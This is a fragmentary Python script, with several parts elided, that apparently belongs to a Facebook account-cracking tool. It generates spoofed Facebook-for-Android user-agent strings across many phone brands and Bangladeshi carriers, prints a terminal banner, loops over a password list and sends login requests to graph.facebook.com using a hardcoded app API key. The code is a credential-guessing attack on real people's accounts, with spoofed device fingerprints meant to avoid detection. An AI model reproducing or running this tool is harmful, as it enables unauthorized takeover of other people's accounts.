...
def random_dalvik_ua_all_2():
    # Facebook app info
    fban = "FB4A"
    facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 77777777))
    density = random.choice(['1.0','1.5','2.0','2.5','3.0'])
    width = random.choice(["720","1080","1280","1440"])
    height = random.choice(["720","1080","1440","1920","2400"])
    fbcr = random.choice(['Grameenphone','Robi','Banglalink','Airtel','Teletalk'])
    fblc = random.choice(["en_US","en_GB","bn_BD"])
    fbpn = "com.facebook.katana"

    # Device Brands & Models
    brands = {
        "Infinix": ["Infinix Note 30","Infinix Zero 30","Infinix Smart 8 Pro","Infinix Hot 40i"],
        "Xiaomi": ["Redmi Note 12","Redmi Note 11","Poco X5 Pro","Redmi Note 10 Pro","Redmi 12C"],
        "Samsung": ["Galaxy A14","Galaxy A32","Galaxy S22 Ultra","Galaxy A51","Galaxy M33","Galaxy A54"],
        "Realme": ["Realme C35","Realme Narzo 50","Realme 8i","Realme GT Neo 3","Realme 11 Pro+"],
        "Oppo": ["Oppo A57","Oppo F19 Pro","Oppo Reno 8","Oppo A78"],
        "Vivo": ["Vivo Y21s","Vivo V25","Vivo Y20","Vivo Y36","Vivo V29e"],
        "Tecno": ["Tecno Spark 10","Tecno Camon 19","Tecno Pova Neo","Tecno Phantom X2"],
        "Google": ["Pixel 6","Pixel 7 Pro","Pixel 8","Pixel 8a"],
        "Symphony": ["Symphony Z60","Symphony Z55","Symphony i99","Symphony i120","Symphony Z45"],
        "Walton": ["Walton Primo H10","Walton Primo RX9","Walton Primo GM4","Walton Primo NF5","Walton Primo HM6"],
        "Itel": ["Itel Vision 3","Itel A60","Itel S23","Itel Vision 2 Plus","Itel A70"],
        "OnePlus": ["OnePlus 9","OnePlus 10 Pro","OnePlus 11","OnePlus Nord 2T"]
    }

    fbmf = random.choice(list(brands.keys()))  # Brand
    fbbd = fbmf  # Board
    fbdv = random.choice(brands[fbmf])  # Device model

    # Android version
    fbsv = f"{random.randint(8, 14)}.{random.randint(0, 5)}.{random.randint(1, 5)}"

    # Random Build Number
    build = random.choice([
        "RRBS31.Q1-3-58-15","TLB33.78-61-2","UTAS34.82-21-2",
        "S1RSS32.38-20-7-5","PPPS29.55-35-18-7","TP1A.220624.014",
        "SP1A.210812.016","UP1A.231005.007"
    ])
    ...
    END = (
        ...
        f"FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};"
        f"FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    )

    # Final Dalvik UA
    ua = f"Dalvik/2.1.0 (Linux; U; Android {fbsv}; {fbdv} Build/{build}) {END}"
    return ua



#M1
def random_dalvik_ua_all():
    fban = "FB4A"
    facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 77777777))
    density = random.choice(['1.0','1.5','2.0','2.5','3.0'])
    ...
    brands = {
        "Infinix": [
            "Infinix Note 30","Infinix Zero 30","Infinix Smart 8 Pro","Infinix Hot 40i"
        ],
        "Xiaomi": [
            "Redmi Note 12","Redmi Note 11","Poco X5 Pro","Redmi Note 10 Pro","Redmi 12C"
        ],
        "Samsung": [
            "Galaxy A14","Galaxy A32","Galaxy S22 Ultra","Galaxy A51","Galaxy M33","Galaxy A54"
        ],
        "Realme": [
            "Realme C35","Realme Narzo 50","Realme 8i","Realme GT Neo 3","Realme 11 Pro+"
        ],
        "Oppo": [
            "Oppo A57","Oppo F19 Pro","Oppo Reno 8","Oppo A78"
        ],
        "Vivo": [
            "Vivo Y21s","Vivo V25","Vivo Y20","Vivo Y36","Vivo V29e"
        ],
        "Tecno": [
            "Tecno Spark 10","Tecno Camon 19","Tecno Pova Neo","Tecno Phantom X2"
        ],
        "Google": [
            "Pixel 6","Pixel 7 Pro","Pixel 8","Pixel 8a"
        ],
        "Symphony": [
            "Symphony Z60","Symphony Z55","Symphony i99","Symphony i120","Symphony Z45"
        ],
        "Walton": [
            "Walton Primo H10","Walton Primo RX9","Walton Primo GM4","Walton Primo NF5","Walton Primo HM6"
        ],
        "Itel": [
            "Itel Vision 3","Itel A60","Itel S23","Itel Vision 2 Plus","Itel A70"
        ],
        "OnePlus": [
            "OnePlus 9","OnePlus 10 Pro","OnePlus 11","OnePlus Nord 2T"
        ]
    }

    # Random Brand & Device
    fbmf = random.choice(list(brands.keys()))
    fbbd = fbmf
    fbdv = random.choice(brands[fbmf])
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 5.2
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_ua_all(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_ua_all_2(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
